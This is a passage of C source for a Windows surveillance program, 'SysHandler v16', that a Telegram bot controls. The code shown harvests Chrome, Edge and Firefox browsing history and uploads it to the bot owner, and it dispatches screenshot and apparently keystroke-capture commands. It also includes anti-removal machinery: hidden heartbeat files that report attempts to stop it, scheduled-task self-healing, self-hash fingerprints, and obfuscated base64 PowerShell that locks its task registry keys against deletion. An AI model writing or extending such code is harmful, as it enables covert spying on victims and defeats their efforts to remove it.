    lstrcatA(base, "\\Mozilla\\Firefox\\Profiles");
    char pat[MAX_PATH * 2];
    lstrcpynA(pat, base, (int)sizeof(pat));
    lstrcatA(pat, "\\*");
    HistDbg2("FFOX SCAN", base, 0);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pat, &fd);
    if (h == INVALID_HANDLE_VALUE)
    {
        HistDbg2("FFOX FINDFAIL", pat, (int)GetLastError());
        return;
    }
    do
    {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        char dbPath[MAX_PATH * 2];
        lstrcpynA(dbPath, base, (int)sizeof(dbPath));
        lstrcatA(dbPath, "\\");
        lstrcatA(dbPath, fd.cFileName);
        lstrcatA(dbPath, "\\places.sqlite");
        if (GetFileAttributesA(dbPath) == INVALID_FILE_ATTRIBUTES) continue;
        HistDbg2("FFOX FOUND", dbPath, 0);
        HistReadFirefoxDb(dbPath, c, job, loUs, hiUs);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

struct HistFile { char* d; size_t n; size_t cap; bool trunc; };

static void HistFileAdd(HistFile* f, const char* s, size_t len)
{
    if (!s || !len || f->trunc) return;
    if (f->n + len > kHistFileCap) { f->trunc = true; return; }
    if (f->n + len + 1 > f->cap)
    {
        size_t nc = f->cap ? f->cap * 2 : 65536;
        while (nc < f->n + len + 1) nc *= 2;
        if (nc > kHistFileCap + 65536) nc = kHistFileCap + 65536;
        char* nd = (char*)realloc(f->d, nc);
        if (!nd) { f->trunc = true; return; }
        f->d   = nd;
        f->cap = nc;
    }
    memcpy(f->d + f->n, s, len);
    f->n += len;
    f->d[f->n] = 0;
}

static void HistFileAddA(HistFile* f, const char* s)
{
    HistFileAdd(f, s, strlen(s));
}

static DWORD WINAPI HistThreadProc(LPVOID param)
{
    HistJob* job = (HistJob*)param;

    HistCtx c;
    memset(&c, 0, sizeof(c));

    long long ftNoon = 0, loChrom = 0, hiChrom = 0, loFfox = 0, hiFfox = 0;
    if (job->mode == kHistDate &&
        HistDayRange(job->day, job->month, job->year, &ftNoon))
    {
        loChrom = ftNoon / 10;                                
        hiChrom = loChrom + 86400LL * 1000000LL;              
        loFfox  = loChrom - 11644473600000000LL;              
        hiFfox  = loFfox + 86400LL * 1000000LL;
    }

    if (job->browser == kHistFirefox)
        HistScanFirefox(&c, job, loFfox, hiFfox);
    else
        HistScanChromium(job->browser, &c, job, loChrom, hiChrom);

    if (c.n > 1) qsort(c.rows, (size_t)c.n, sizeof(HistRow), HistRowCmp);

    const char* bname = HistBrowserName(job->browser);

    if (c.n == 0)
    {
        char msg[160];
        if (c.dbFound == 0)
            wsprintfA(msg, "No %s history found on this computer.", bname);
        else
            wsprintfA(msg, "No history entries found for %s.", bname);
        TgSendTextDyn(msg, kKbJson);
        free(c.rows);
        free(job);
        return 0;
    }

    int outN = c.n;
    if (job->mode == kHistLast && outN > job->limit) outN = job->limit;

    char qdesc[64];
    if (job->mode == kHistLast)
        wsprintfA(qdesc, "last %d", job->limit);
    else if (job->mode == kHistDate)
        wsprintfA(qdesc, "%02d/%02d/%04d", job->day, job->month, job->year);
    else
        lstrcpyA(qdesc, "all");

    SYSTEMTIME now;
    GetLocalTime(&now);

    HistFile f;
    memset(&f, 0, sizeof(f));
    char line[1024];

    HistFileAddA(&f, "\xEF\xBB\xBF");                    
    HistFileAddA(&f, "==============================================\r\n");
    wsprintfA(line, "SysHandler v16 - %s browsing history\r\n", bname);
    HistFileAddA(&f, line);
    wsprintfA(line, "Query: %s\r\n", qdesc);
    HistFileAddA(&f, line);
    wsprintfA(line, "Generated: %02u/%02u/%04u %02u:%02u (local time)\r\n",
              now.wDay, now.wMonth, now.wYear, now.wHour, now.wMinute);
    HistFileAddA(&f, line);
    wsprintfA(line, "Entries: %d%s\r\n", outN,
              c.rowCapped ? " (row cap reached)" : "");
    HistFileAddA(&f, line);
    HistFileAddA(&f, "==============================================\r\n\r\n");
    HistFileAddA(&f, "#   | Date and time       | Title | URL\r\n");
    HistFileAddA(&f, "----+---------------------+-------+-------------------\r\n");

    for (int i = 0; i < outN; ++i)
    {
        char ts[24];
        HistFmtTime(c.rows[i].t, job->browser != kHistFirefox,
                    ts, (int)sizeof(ts));
        wsprintfA(line, "%3d | %s | %s | %s\r\n",
                  i + 1, ts, c.rows[i].title, c.rows[i].url);
        HistFileAddA(&f, line);
        if (f.trunc) break;
    }
    if (f.trunc) HistFileAddA(&f, "(file truncated at 20 MB)\r\n");

    const char* bl = (job->browser == kHistChrome) ? "chrome"
                   : (job->browser == kHistEdge)   ? "edge"   : "firefox";
    char fname[64];
    if (job->mode == kHistLast)
        wsprintfA(fname, "%s-history-last%d.txt", bl, job->limit);
    else if (job->mode == kHistDate)
        wsprintfA(fname, "%s-history-%02d-%02d-%04d.txt",
                  bl, job->day, job->month, job->year);
    else
        wsprintfA(fname, "%s-history-all.txt", bl);

    char cap[128];
    wsprintfA(cap, "%s history \xE2\x80\x94 %s \xE2\x80\x94 %d entries",
              bname, qdesc, outN);

    if (f.d && f.n)
    {
        DWORD bodyLen = 0;
        unsigned char* body = BuildSendDocBody(fname, f.d, (DWORD)f.n,
                                               cap, &bodyLen);
        if (body)
        {
            char path[384], ctype[128];
            wsprintfA(path, "/bot%s/sendDocument", kBotToken);
            wsprintfA(ctype, "multipart/form-data; boundary=%s", kMultipartBnd);
            char* resp = NULL;
            DWORD respLen = 0, status = 0;
            HttpPost(kApiBase, path, ctype, (const char*)body, bodyLen,
                     &resp, &respLen, &status);
            free(body);
            FreeResp(&resp);
            LogLine(L"dll", L"history: document sent to the owner", 0);
        }
    }
    free(f.d);
    free(c.rows);
    free(job);
    return 0;
}

static const char kHistPickerJson[] =
    "{\"inline_keyboard\":[[{\"text\":\"Chrome\",\"callback_data\":\"hist_c\"},"
    "{\"text\":\"Edge\",\"callback_data\":\"hist_e\"},"
    "{\"text\":\"Firefox\",\"callback_data\":\"hist_f\"}]]}";

static void HistMenu()
{
    InterlockedExchange(&g_autoAwait, 0);
    InterlockedExchange(&g_keysAwait, 0);
    InterlockedExchange(&g_histAwait, 0);
    TgSendTextDyn("Which browser's history should I read?", kHistPickerJson);
    LogLine(L"dll", L"history: browser picker shown", 0);
}

static void HistAskQuery(int browser)
{
    InterlockedExchange(&g_histBrowser, browser);
    InterlockedExchange(&g_histAwait, 1);
    char msg[160];
    wsprintfA(msg, "%s history \xE2\x80\x94 send a number (last N entries), "
                   "a date (DD/MM/YYYY), or ALL.", HistBrowserName(browser));
    TgSendTextDyn(msg, NULL);
    LogLine(L"dll", L"history: waiting for the owner's query", 0);
}

static bool HistParseDate(const char* s, int* d, int* m, int* y)
{
    int  part[3] = { 0, 0, 0 };
    int  pi = 0;
    int  val = 0;
    bool hasVal = false;
    char lastSep = 0;
    const char* p = s;
    for (;; ++p)
    {
        if (*p >= '0' && *p <= '9')
        {
            val = val * 10 + (*p - '0');
            if (val > 9999) return false;
            hasVal = true;
            continue;
        }
        if (*p == '/' || *p == '-')
        {
            if (!hasVal || pi >= 2) return false;
            if (lastSep && *p != lastSep) return false;
            lastSep = *p;
            part[pi++] = val;
            val = 0;
            hasVal = false;
            continue;
        }
        break;
    }
    if (*p != 0 || !hasVal || pi != 2) return false;
    part[2] = val;
    *d = part[0];
    *m = part[1];
    *y = part[2];
    if (*y < 2000 || *y > 2100 || *m < 1 || *m > 12 || *d < 1) return false;
    static const int kMd[12] = { 31,28,31,30,31,30,31,31,30,31,30,31 };
    int dim = kMd[*m - 1];
    if (*m == 2 && ((*y % 4 == 0 && *y % 100 != 0) || *y % 400 == 0)) dim = 29;
    return *d <= dim;
}

static void HistHandleQuery(const char* text)
{
    while (*text == ' ' || *text == '\t') ++text;
    int browser = (int)InterlockedCompareExchange(&g_histBrowser, 0, 0);
    if (browser < kHistChrome || browser > kHistFirefox) browser = kHistChrome;

    static const char kReAsk[] = "Please send a number (last N entries), "
                                 "a date (DD/MM/YYYY), or ALL.";

    HistJob* job = (HistJob*)malloc(sizeof(HistJob));
    if (!job) return;
    memset(job, 0, sizeof(*job));
    job->browser = browser;

    if (lstrcmpiA(text, "all") == 0)
    {
        job->mode = kHistAll;
    }
    else
    {
        const char* p = text;
        while (*p >= '0' && *p <= '9') ++p;
        if (p != text && *p == 0)
        {
            const int n = atoi(text);
            if (n < 1 || n > kHistMaxNumber)
            {
                TgSendTextDyn(kReAsk, NULL);
                free(job);
                return;
            }
            job->mode  = kHistLast;
            job->limit = n;
        }
        else if (HistParseDate(text, &job->day, &job->month, &job->year))
        {
            job->mode = kHistDate;
        }
        else
        {
            TgSendTextDyn(kReAsk, NULL);
            free(job);
            return;
        }
    }

    InterlockedExchange(&g_histAwait, 0);     

    char ack[64];
    wsprintfA(ack, "Reading %s history...", HistBrowserName(browser));
    TgSendTextDyn(ack, NULL);

    HANDLE h = CreateThread(NULL, 0, HistThreadProc, job, 0, NULL);
    if (!h)
    {
        free(job);
        TgSendTextDyn("Could not start the history reader, try again.",
                      kKbJson);
        return;
    }
    CloseHandle(h);
    LogLine(L"dll", L"history: dump started by the owner", 0);
}


static void TamperFmt64(long long v, char* out)
{
    char tmp[24];
    int n = 0;
    unsigned long long u = (v < 0) ? 0ULL : (unsigned long long)v;
    if (!u) tmp[n++] = '0';
    while (u && n < 22) { tmp[n++] = (char)('0' + (int)(u % 10ULL)); u /= 10ULL; }
    int o = 0;
    for (int i = n - 1; i >= 0; --i) out[o++] = tmp[i];
    out[o] = 0;
}

static long long TamperNow()
{
    FILETIME ft;
    GetSystemTimeAsFileTime(&ft);
    return ((((long long)ft.dwHighDateTime) << 32) | (long long)ft.dwLowDateTime)
           / 10000000LL - 11644473600LL;
}

static void TamperPath(const char* file, char* out, size_t cch)
{
    out[0] = 0;
    char pd[MAX_PATH];
    DWORD pl = GetEnvironmentVariableA("ProgramData", pd, (DWORD)sizeof(pd));
    if (!pl || pl >= sizeof(pd) || (size_t)pl + 32 >= cch) return;
    lstrcpynA(out, pd, (int)cch);
    lstrcatA(out, "\\SysHandler\\");
    lstrcatA(out, file);
}

static void TamperWriteFile(const char* file, const char* content)
{
    char path[MAX_PATH * 2];
    TamperPath(file, path, sizeof(path));
    if (!path[0]) return;
    HANDLE h = CreateFileA(path, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD wrote = 0;
    WriteFile(h, content, (DWORD)strlen(content), &wrote, NULL);
    CloseHandle(h);
}

static bool TamperReadFile(const char* file, char* buf, size_t cch)
{
    buf[0] = 0;
    char path[MAX_PATH * 2];
    TamperPath(file, path, sizeof(path));
    if (!path[0]) return false;
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD got = 0;
    bool ok = false;
    if (ReadFile(h, buf, (DWORD)(cch - 1), &got, NULL) && got > 0 && got < cch)
    {
        buf[got] = 0;
        for (char* p = buf; *p; ++p)
            if (*p == '\r' || *p == '\n') { *p = 0; break; }
        ok = true;
    }
    CloseHandle(h);
    return ok;
}

static void TamperBeat()
{
    char stamp[24];
    TamperFmt64(TamperNow(), stamp);
    SYSTEMTIME st;
    GetLocalTime(&st);
    char content[48];
    wsprintfA(content, "%s|%02u:%02u", stamp, st.wHour, st.wMinute);
    TamperWriteFile("hb.tmp", content);
}

static void TamperReport(const char* what)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    char msg[160];
    wsprintfA(msg, "%s at %02u:%02u \xE2\x80\x94 restored", what, st.wHour, st.wMinute);
    TgSendText(msg);
    LogLine(L"dll", L"tamper: incident reported to the owner", 0);
}

static void TamperStartupCheck()
{
    char hb[48] = "";
    if (!TamperReadFile("hb.tmp", hb, sizeof(hb))) return;   
    char* bar = strchr(hb, '|');
    if (!bar) return;
    *bar = 0;
    const long long stamp = _atoi64(hb);
    if (stamp <= 0) return;
    const long long now = TamperNow();
    if ((now - stamp) > 150) return;   
    char sd[48] = "";
    long long sdStamp = 0;
    if (TamperReadFile("sd.tmp", sd, sizeof(sd)))
    {
        char* bar2 = strchr(sd, '|');
        if (bar2) { *bar2 = 0; sdStamp = _atoi64(sd); }
    }
    if (sdStamp > stamp) return;       
    char msg[128];
    wsprintfA(msg, "someone tried to stop me at %s \xE2\x80\x94 revived", bar + 1);
    TgSendText(msg);
    LogLine(L"dll", L"tamper: external kill detected - revival reported", 0);
}

static const char kSdClass[] = "SysHandlerShutdownWatch";

static LRESULT CALLBACK SdWndProc(HWND w, UINT m, WPARAM wp, LPARAM lp)
{
    if (m == WM_QUERYENDSESSION) return TRUE;
    if (m == WM_ENDSESSION && wp)
    {
        char stamp[24];
        TamperFmt64(TamperNow(), stamp);
        SYSTEMTIME st;
        GetLocalTime(&st);
        char content[48];
        wsprintfA(content, "%s|%02u:%02u", stamp, st.wHour, st.wMinute);
        TamperWriteFile("sd.tmp", content);
    }
    return DefWindowProcA(w, m, wp, lp);
}

static DWORD WINAPI SdWatchThreadProc(LPVOID)
{
    WNDCLASSA wc;
    memset(&wc, 0, sizeof(wc));
    wc.lpfnWndProc   = SdWndProc;
    wc.hInstance     = (HINSTANCE)g_selfModule;
    wc.lpszClassName = kSdClass;
    if (!RegisterClassA(&wc)) return 0;
    if (!CreateWindowExA(0, kSdClass, "", 0, 0, 0, 0, 0, HWND_MESSAGE,
                         NULL, wc.hInstance, NULL))
        return 0;
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
    return 0;
}

static void HandleUpdate(const char* blk)
{
    char chatId[32] = "";

    const BOOL isCallback = (strstr(blk, "\"callback_query\":") != NULL);
    const BOOL isMessage  = (!isCallback && strstr(blk, "\"message\":") != NULL &&
                             strstr(blk, "\"text\":") != NULL);
    if (!isCallback && !isMessage) return;

    const char* cq = strstr(blk, "\"chat\":{\"id\":");
    if (!cq) return;
    cq += 13;
    int i = 0;
    if (*cq == '-') { chatId[i++] = '-'; ++cq; }
    while (*cq >= '0' && *cq <= '9' && i < 20)
        chatId[i++] = *cq++;
    chatId[i] = 0;

    if (lstrcmpA(kBotChatId, chatId) != 0)
    {
        LogLine(L"dll", L"ignored update from an unauthorized chat", 0);
        return;
    }

    if (isCallback)
    {
        char data[64] = "";
        JsonGetString(blk, "data", data, sizeof(data));

        char cbId[64] = "";
        const char* cb  = strstr(blk, "\"callback_query\":");
        const char* idp = cb ? strstr(cb, "\"id\":\"") : NULL;
        if (idp)
        {
            idp += 6;
            int j = 0;
            while (*idp && *idp != '"' && j < 63) cbId[j++] = *idp++;
            cbId[j] = 0;
        }
        TgAnswerCallback(cbId, "");

        if (!lstrcmpA(data, "shot")) TakeAndSend();
        else if (!lstrcmpA(data, "screentime")) ScreentimeToggle();
        else if (!lstrcmpA(data, "keys")) KeysMenu();
        else if (!lstrcmpA(data, "hist")) HistMenu();
        else if (!lstrcmpA(data, "hist_c")) HistAskQuery(kHistChrome);
        else if (!lstrcmpA(data, "hist_e")) HistAskQuery(kHistEdge);
        else if (!lstrcmpA(data, "hist_f")) HistAskQuery(kHistFirefox);
        return;
    }

    if (InterlockedCompareExchange(&g_autoAwait, 0, 0) != 0)
    {
        char text[128] = "";
        JsonGetString(blk, "text", text, sizeof(text));
        if (text[0]) ScreentimeHandleSeconds(text);
    }
    else if (InterlockedCompareExchange(&g_keysAwait, 0, 0) != 0)
    {
        char text[128] = "";
        JsonGetString(blk, "text", text, sizeof(text));
        if (text[0]) KeysHandleSeconds(text);
    }
    else if (InterlockedCompareExchange(&g_histAwait, 0, 0) != 0)
    {
        char text[128] = "";
        JsonGetString(blk, "text", text, sizeof(text));
        if (text[0]) HistHandleQuery(text);
    }
}

static unsigned long g_lastUpdate = 0;

static void ProcessUpdates(const char* json)
{
    const char* p = json;
    while (p && (p = strstr(p, "\"update_id\"")) != NULL)
    {
        const char* blkStart = p;
        unsigned long uid = strtoul(JsonAfterKey(p, "update_id"), NULL, 10);
        const char* next = strstr(p + 1, "\"update_id\"");
        size_t blkLen = next ? (size_t)(next - blkStart) : strlen(blkStart);

        char* blk = (char*)malloc(blkLen + 1);
        if (blk)
        {
            memcpy(blk, blkStart, blkLen);
            blk[blkLen] = 0;
            HandleUpdate(blk);
            free(blk);
        }
        if (uid + 1 > g_lastUpdate) g_lastUpdate = uid + 1;
        p = next;
    }
}

static void SleepBot(DWORD ms)
{
    const DWORD kSleepSlice = 500;
    DWORD waited = 0;
    while (waited < ms && !g_stop)
    {
        DWORD chunk = (ms - waited < kSleepSlice) ? (ms - waited) : kSleepSlice;
        Sleep(chunk);
        waited += chunk;
    }
}

static void HealAppend(char* dst, size_t cap, const char* s)
{
    size_t o = strlen(dst);
    for (; *s && o + 1 < cap; ++s) dst[o++] = *s;
    dst[o] = 0;
}

static BOOL HealTaskVisible(const char* winDir, const char* name)
{
    char p[MAX_PATH * 2];
    p[0] = 0;
    HealAppend(p, sizeof(p), winDir);
    HealAppend(p, sizeof(p), "\\System32\\Tasks\\");
    HealAppend(p, sizeof(p), name);
    DWORD at = GetFileAttributesA(p);
    return (at != INVALID_FILE_ATTRIBUTES && !(at & FILE_ATTRIBUTE_DIRECTORY));
}

static void HealSpawn(const char* cmdline)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    memset(&pi, 0, sizeof(pi));
    if (!CreateProcessA(NULL, (LPSTR)cmdline, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
        LogLine(L"dll", L"self heal: task respawn failed", 0);
        return;
    }
    WaitForSingleObject(pi.hProcess, 15000);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

static const char kPsArmB64[] =
    "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBu"
    "AHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJABiAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcA"
    "QQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgBy"
    "AGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAGMAaABlAGQAdQBsAGUAXABUAGEAcwBrAEMAYQBjAGgA"
    "ZQAnAAoAZgBvAHIAZQBhAGMAaAAoACQAbgAgAGkAbgAgAEAAKAAnAFMAeQBzAEgAYQBuAGQAbABl"
    "AHIAIABXAGEAdABjAGgAZABvAGcAJwAsACcAUwB5AHMASABhAG4AZABsAGUAcgAgAEYAYQBsAGwA"
    "YgBhAGMAawAnACkAKQB7AAoAJABwAD0AIgAkAGIAXABUAHIAZQBlAFwAJABuACIACgAkAGkAPQAo"
    "AEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4A"
    "YQBtAGUAIABJAGQAKQAuAEkAZAAKACQAawA9AEAAKAAkAHAAKQAKAGkAZgAoACQAaQApAHsAJABr"
    "ACsAPQAoACIAJABiAFwAVABhAHMAawBzAFwAJABpACIAKQB9AAoAZgBvAHIAZQBhAGMAaAAoACQA"
    "cQAgAGkAbgAgACQAawApAHsACgBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAcQApAHsACgAk"
    "AGEAPQBHAGUAdAAtAEEAYwBsACAAJABxAAoAJAByAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMA"
    "eQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQQBjAGMAZQBzAHMAQwBvAG4AdAByAG8AbAAu"
    "AFIAZQBnAGkAcwB0AHIAeQBBAGMAYwBlAHMAcwBSAHUAbABlACgAKABOAGUAdwAtAE8AYgBqAGUA"
    "YwB0ACAAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAu"
    "AFMAZQBjAHUAcgBpAHQAeQBJAGQAZQBuAHQAaQBmAGkAZQByACgAJwBTAC0AMQAtADEALQAwACcA"
    "KQApACwAJwBEAGUAbABlAHQAZQAnACwAJwBDAG8AbgB0AGEAaQBuAGUAcgBJAG4AaABlAHIAaQB0"
    "ACcALAAnAE4AbwBuAGUAJwAsACcARABlAG4AeQAnACkACgAkAGEALgBBAGQAZABBAGMAYwBlAHMA"
    "cwBSAHUAbABlACgAJAByACkAfABPAHUAdAAtAE4AdQBsAGwACgBTAGUAdAAtAEEAYwBsACAALQBQ"
    "AGEAdABoACAAJABxACAALQBBAGMAbABPAGIAagBlAGMAdAAgACQAYQAKAH0AfQAKAH0A";

static const char kPsLiftB64[] =
    "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBu"
    "AHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAJABiAD0AJwBIAEsATABNADoAXABTAE8ARgBUAFcA"
    "QQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAIABOAFQAXABDAHUAcgBy"
    "AGUAbgB0AFYAZQByAHMAaQBvAG4AXABTAGMAaABlAGQAdQBsAGUAXABUAGEAcwBrAEMAYQBjAGgA"
    "ZQAnAAoAZgBvAHIAZQBhAGMAaAAoACQAbgAgAGkAbgAgAEAAKAAnAFMAeQBzAEgAYQBuAGQAbABl"
    "AHIAIABXAGEAdABjAGgAZABvAGcAJwAsACcAUwB5AHMASABhAG4AZABsAGUAcgAgAEYAYQBsAGwA"
    "YgBhAGMAawAnACkAKQB7AAoAJABwAD0AIgAkAGIAXABUAHIAZQBlAFwAJABuACIACgAkAGkAPQAo"
    "AEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHAAIAAtAE4A"
    "YQBtAGUAIABJAGQAKQAuAEkAZAAKACQAawA9AEAAKAAkAHAAKQAKAGkAZgAoACQAaQApAHsAJABr"
    "ACsAPQAoACIAJABiAFwAVABhAHMAawBzAFwAJABpACIAKQB9AAoAZgBvAHIAZQBhAGMAaAAoACQA"
    "cQAgAGkAbgAgACQAawApAHsACgBpAGYAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAcQApAHsACgAk"
    "AGEAPQBHAGUAdAAtAEEAYwBsACAAJABxAAoAZgBvAHIAZQBhAGMAaAAoACQAeAAgAGkAbgAgAEAA"
    "KAAkAGEALgBBAGMAYwBlAHMAcwB8AFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0AHsAJABfAC4AQQBj"
    "AGMAZQBzAHMAQwBvAG4AdAByAG8AbABUAHkAcABlACAALQBlAHEAIAAnAEQAZQBuAHkAJwB9ACkA"
    "KQB7ACQAYQAuAFIAZQBtAG8AdgBlAEEAYwBjAGUAcwBzAFIAdQBsAGUAKAAkAHgAKQB8AE8AdQB0"
    "AC0ATgB1AGwAbAB9AAoAUwBlAHQALQBBAGMAbAAgAC0AUABhAHQAaAAgACQAcQAgAC0AQQBjAGwA"
    "TwBiAGoAZQBjAHQAIAAkAGEACgB9AH0ACgB9AA==";

typedef void* BcryptAlgHandle;
typedef void* BcryptHashHandle;
typedef LONG (WINAPI *BcryptOpenAlgFn)(BcryptAlgHandle*, LPCWSTR, LPCWSTR, DWORD);
typedef LONG (WINAPI *BcryptCreateHashFn)(BcryptAlgHandle, BcryptHashHandle*,
                                          UCHAR*, DWORD, UCHAR*, DWORD, DWORD);
typedef LONG (WINAPI *BcryptHashDataFn)(BcryptHashHandle, UCHAR*, DWORD, DWORD);
typedef LONG (WINAPI *BcryptFinishHashFn)(BcryptHashHandle, UCHAR*, DWORD, DWORD);
typedef LONG (WINAPI *BcryptDestroyHashFn)(BcryptHashHandle);
typedef LONG (WINAPI *BcryptCloseAlgFn)(BcryptAlgHandle);

static bool Sha256FileA(const char* path, char outHex[65])
{
    outHex[0] = 0;
    HANDLE h = CreateFileA(path, GENERIC_READ,
                           FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                           NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return false;
    bool ok = false;
    HMODULE bc = LoadLibraryW(L"bcrypt.dll");
    for (;;)
    {
        if (!bc) break;
        BcryptOpenAlgFn openAlg = (BcryptOpenAlgFn)GetProcAddress(bc, "BCryptOpenAlgorithmProvider");
        BcryptCreateHashFn createHash = (BcryptCreateHashFn)GetProcAddress(bc, "BCryptCreateHash");
        BcryptHashDataFn hashData = (BcryptHashDataFn)GetProcAddress(bc, "BCryptHashData");
        BcryptFinishHashFn finishHash = (BcryptFinishHashFn)GetProcAddress(bc, "BCryptFinishHash");
        BcryptDestroyHashFn destroyHash = (BcryptDestroyHashFn)GetProcAddress(bc, "BCryptDestroyHash");
        BcryptCloseAlgFn closeAlg = (BcryptCloseAlgFn)GetProcAddress(bc, "BCryptCloseAlgorithmProvider");
        if (!openAlg || !createHash || !hashData || !finishHash ||
            !destroyHash || !closeAlg) break;
        BcryptAlgHandle alg = NULL;
        if (openAlg(&alg, L"SHA256", NULL, 0) != 0 || !alg) break;
        BcryptHashHandle hs = NULL;
        UCHAR obj[1024];
        if (createHash(alg, &hs, obj, (DWORD)sizeof(obj), NULL, 0, 0) != 0 || !hs)
        {
            closeAlg(alg);
            break;
        }
        static const char kHex[] = "0123456789abcdef";
        UCHAR buf[65536];
        UCHAR dig[32];
        DWORD got = 0;
        bool hashed = true;
        for (;;)
        {
            if (!ReadFile(h, buf, (DWORD)sizeof(buf), &got, NULL)) { hashed = false; break; }
            if (got == 0) break;
            if (hashData(hs, buf, got, 0) != 0) { hashed = false; break; }
        }
        if (hashed && finishHash(hs, dig, (DWORD)sizeof(dig), 0) == 0)
        {
            for (int i = 0; i < 32; ++i)
            {
                outHex[i * 2]     = kHex[dig[i] >> 4];
                outHex[i * 2 + 1] = kHex[dig[i] & 0xF];
            }
            outHex[64] = 0;
            ok = true;
        }
        destroyHash(hs);
        closeAlg(alg);
        break;
    }
    if (bc) FreeLibrary(bc);
    CloseHandle(h);
    return ok;
}

static BOOL FileHashOk(const char* path, const char* want)
{
    if (!want[0]) return TRUE;
    char got[65];
    if (!Sha256FileA(path, got)) return FALSE;
    return lstrcmpiA(got, want) == 0;
}

static BOOL FileMissingOrBad(const char* path, const char* want)
{
    if (GetFileAttributesA(path) == INVALID_FILE_ATTRIBUTES) return TRUE;
    return !FileHashOk(path, want);
}

static BOOL CopyOver(const char* from, const char* to)
{
    if (!CopyFileA(from, to, FALSE)) return FALSE;
    SetFileAttributesA(to, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    return TRUE;
}

static BOOL ReadFingerprint(const char* name, char out[65])
{
    out[0] = 0;
    HKEY k = NULL;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\SysHandler", 0,
                      KEY_QUERY_VALUE, &k) != ERROR_SUCCESS) return FALSE;
    BYTE v[130];
    DWORD cb = sizeof(v);
    DWORD ty = 0;
    BOOL ok = FALSE;
    if (RegQueryValueExA(k, name, NULL, &ty, v, &cb) == ERROR_SUCCESS &&
        ty == REG_SZ && cb >= 65)
    {
        BOOL hex = TRUE;
        for (int i = 0; i < 64; ++i)
        {
            char c = (char)v[i];
            if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
                  (c >= 'A' && c <= 'F'))) { hex = FALSE; break; }
        }
        if (hex)
        {
            memcpy(out, v, 64);
            out[64] = 0;
            ok = TRUE;
        }
    }
    RegCloseKey(k);
    return ok;
}

static void WriteFingerprints(const char* exeP, const char* dllP)
{
    char eh[65];
    char dh[65];
    if (!Sha256FileA(exeP, eh) || !Sha256FileA(dllP, dh)) return;
    HKEY k = NULL;
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, "Software\\SysHandler", 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &k, NULL)
        != ERROR_SUCCESS) return;
    RegSetValueExA(k, "ExeHash", 0, REG_SZ, (const BYTE*)eh, 65);
    RegSetValueExA(k, "DllHash", 0, REG_SZ, (const BYTE*)dh, 65);
    RegCloseKey(k);
    LogLine(L"dll", L"fingerprints written", 0);
}

static void KillBotHosts()
{
    DWORD self = GetCurrentProcessId();
    HANDLE ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (ss == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(ss, &pe))
    {
        do
        {
            if (lstrcmpiW(pe.szExeFile, L"SysHandler.exe") == 0 &&
                pe.th32ProcessID != self)
            {
                HANDLE p = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (p)
                {
                    TerminateProcess(p, 1);
                    CloseHandle(p);
                }
            }
        } while (Process32NextW(ss, &pe));
    }
    CloseHandle(ss);
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (ss == INVALID_HANDLE_VALUE) return;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(ss, &pe))
    {
        do
        {
            if (lstrcmpiW(pe.szExeFile, L"rundll32.exe") != 0) continue;
            HANDLE p = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
